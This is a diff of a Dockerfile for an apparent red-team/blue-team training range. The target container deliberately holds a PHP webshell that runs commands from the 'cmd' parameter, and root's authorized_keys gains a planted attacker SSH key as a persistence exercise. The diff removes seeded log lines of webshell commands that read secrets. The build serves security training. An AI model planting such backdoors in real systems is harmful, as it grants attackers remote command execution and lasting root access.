@@ -62,33 +62,33 @@ RUN mkdir -p /opt/scripts \
     && printf '* * * * * root /opt/scripts/system_backup.sh\n' > /etc/cron.d/system_backup \
     && chmod 644 /etc/cron.d/system_backup
 
-# ---- 隱藏關卡6：webshell（供紅隊operation用，藍隊規則上不能刪除）----
+# ---- 紅隊 web 入侵入口：webshell（www-data RCE，供紅隊 operation 用，藍隊規則上不能刪除）----
 RUN mkdir -p /opt/webshell \
     && printf '<?php system($_GET["cmd"] ?? "id"); ?>\n' > /opt/webshell/.backdoor.php
 
-# ---- 隱藏關卡6：預埋攻擊軌跡 ----
-# checker 只認「log 裡打過 backdoor.php 的來源IP」，沒有紅隊在打時這關會停在 pending，
-# 體驗組等於永遠拿不到。預埋一段既有攻擊軌跡讓鑑識本身就是完整的題目：
-# 對抗組的真實紅隊流量直接疊在這幾行後面，兩種場次共用同一套判定，不必分模式。
+# ---- 隱藏關卡6：SSH 持久化後門（root authorized_keys 植入攻擊者公鑰）----
+# 紅隊拿到容器內 root（走漏洞3 或 5 提權）後，會在 /root/.ssh/authorized_keys 種一把
+# 自己的公鑰當後門，確保下次不必重打一次 SQLi、重破一次密碼就能直接 ssh root 回來。
+# 這題接在攻擊鏈「拿到 root」之後，是紅隊真實會做的下一步；藍隊的任務是事件應變的最後
+# 一步：找出並清掉這把多餘的 key（持久化清除）。
 #
-# 攻擊者IP刻意選 RFC 5737 的文件用網段（203.0.113.0/24、198.51.100.0/24）——
-# 這兩段不可能跟 target-net 或 SLA 探測來源撞號。撞到的話學員照著封鎖就會把
-# 自己的服務打掛，SLA 直接歸零。
+# 比照隱藏關卡預埋假資料的做法：build 時就把「攻擊者」測試公鑰跟合法 root key 一起塞進
+# authorized_keys，所以就算這場沒有真的紅隊、只是體驗場次，也永遠有一把後門可找、可清。
+# 判定只看攻擊者那把 key 的金鑰材料在不在（見 scoring-engine/checker.py 的
+# check_ssh_backdoor_removed，比對的 base64 blob 必須跟這裡的攻擊者公鑰逐字元一致）。
+# 全程只是檔案讀寫，不需要 NET_ADMIN 或任何容器層級能力——徹底避開舊版關卡6
+# 「webshell 鑑識＋iptables 封鎖」在座位容器沒有 NET_ADMIN 的死路（issue #152）。
 #
-# 中間夾雜正常校務流量，逼學員真的去過濾 request_uri，而不是把 log 裡每個 IP 都擋掉。
-RUN mkdir -p /var/log/nginx && printf '%s\n' \
-    '{"remote_addr":"10.20.30.41","request_method":"GET","request_uri":"/courses.html","status":"200","body_bytes_sent":"8213","request_time":"0.012","upstream_response_time":"0.011","http_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","host":"campus.portal"}' \
-    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/","status":"200","body_bytes_sent":"21319","request_time":"0.009","upstream_response_time":"0.008","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
-    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/uploads/","status":"404","body_bytes_sent":"162","request_time":"0.002","upstream_response_time":"-","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
-    '{"remote_addr":"10.20.30.41","request_method":"GET","request_uri":"/api/course/list","status":"200","body_bytes_sent":"1044","request_time":"0.018","upstream_response_time":"0.017","http_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","host":"campus.portal"}' \
-    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=id","status":"200","body_bytes_sent":"54","request_time":"0.031","upstream_response_time":"0.030","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
-    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=whoami","status":"200","body_bytes_sent":"9","request_time":"0.028","upstream_response_time":"0.027","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
-    '{"remote_addr":"10.20.30.57","request_method":"POST","request_uri":"/api/student/login","status":"200","body_bytes_sent":"312","request_time":"0.041","upstream_response_time":"0.040","http_user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15","host":"campus.portal"}' \
-    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=cat%20/opt/portal/.env","status":"200","body_bytes_sent":"96","request_time":"0.033","upstream_response_time":"0.032","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
-    '{"remote_addr":"198.51.100.23","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=uname%20-a","status":"200","body_bytes_sent":"128","request_time":"0.026","upstream_response_time":"0.025","http_user_agent":"curl/8.5.0","host":"campus.portal"}' \
-    '{"remote_addr":"10.20.30.41","request_method":"GET","request_uri":"/grades.html","status":"200","body_bytes_sent":"6180","request_time":"0.014","upstream_response_time":"0.013","http_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","host":"campus.portal"}' \
-    '{"remote_addr":"198.51.100.23","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=ls%20-la%20/root","status":"200","body_bytes_sent":"241","request_time":"0.029","upstream_response_time":"0.028","http_user_agent":"curl/8.5.0","host":"campus.portal"}' \
-    > /var/log/nginx/access_json.log
+# 合法 key 註解 root@target-box（校務管理者本來就有的 root 存取，藍隊應保留）；
+# 攻擊者 key 註解 redteam@metis-persistence（紅隊植入的持久化後門，鑑識時要認出並清掉這把）。
+RUN mkdir -p /root/.ssh \
+    && printf '%s\n' \
+        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE4gNLP69f9MCOuBreotLAAae9Gf7f1X3O60DMauObbm root@target-box' \
+        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMAG/KdJzvE/WE7Ywf6rg0Xo2/8zhNGEQRG7BCQP1Ekz redteam@metis-persistence' \
+        > /root/.ssh/authorized_keys \
+    && chmod 700 /root/.ssh \
+    && chmod 600 /root/.ssh/authorized_keys \
+    && chown -R root:root /root/.ssh
 
 # ---- 隱藏關卡7：容器逃逸（曝露的 docker socket，honeypot 版）----
 # 一支內建的假 daemon（dind-honeypot.js）在 /var/run/dind/docker.sock 上監聽，重現
